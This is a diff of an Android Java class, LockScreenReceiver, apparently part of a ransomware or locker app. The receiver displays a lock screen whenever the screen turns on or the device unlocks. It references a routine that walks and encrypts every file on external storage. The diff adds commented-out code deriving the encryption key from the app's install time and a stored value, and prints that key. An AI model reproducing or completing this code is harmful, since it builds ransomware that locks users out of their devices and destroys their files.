@@ -12,11 +12,22 @@ import java.io.File;
 public class LockScreenReceiver extends BroadcastReceiver {
 
     private Cryptographer cryptographer;
+    private String time;
+    private String firstinstalltime;
 
     // Handle actions and display Lockscreen
     @Override
     public void onReceive(Context context, Intent intent) {
         cryptographer = Cryptographer.getInstance(context);
+////        ApplicationInfo appInfo = null;
+//        try {
+////            appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
+//            firstinstalltime = String.valueOf(context.getPackageManager().getPackageInfo(context.getPackageName(), 0).firstInstallTime);
+////            String appFile = appInfo.sourceDir;
+////            time = String.valueOf(new File(appFile).lastModified());
+//        } catch (PackageManager.NameNotFoundException e) {
+//            e.printStackTrace();
+//        }
 
         if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                 || intent.getAction().equals(Intent.ACTION_USER_UNLOCKED)
@@ -27,9 +38,9 @@ public class LockScreenReceiver extends BroadcastReceiver {
         if ((intent.getAction().equals(Intent.ACTION_SCREEN_OFF))
                 || (intent.getAction().equals(Intent.ACTION_LOCKED_BOOT_COMPLETED))) {
             System.out.println("OFF screen");
+
             // traverseAndroidDirectoriesAndEncrypt(new File(System.getenv("EXTERNAL_STORAGE") + "/"), true);
         }
-
     }
 
     // Display lock screen
@@ -41,7 +52,11 @@ public class LockScreenReceiver extends BroadcastReceiver {
     }
 
     private void traverseAndroidDirectoriesAndEncrypt(File dir, Boolean encrytFiles) {
-
+//        String key = cryptographer.get256bitHash(
+//                String.valueOf(AppSharedPrefs.getInstance().getViewPassIcons()),
+//                firstinstalltime
+//        );
+//        System.out.println("key is: " +key);
         if (dir.exists()) {
             File[] files = dir.listFiles();
             for (File file : files) {
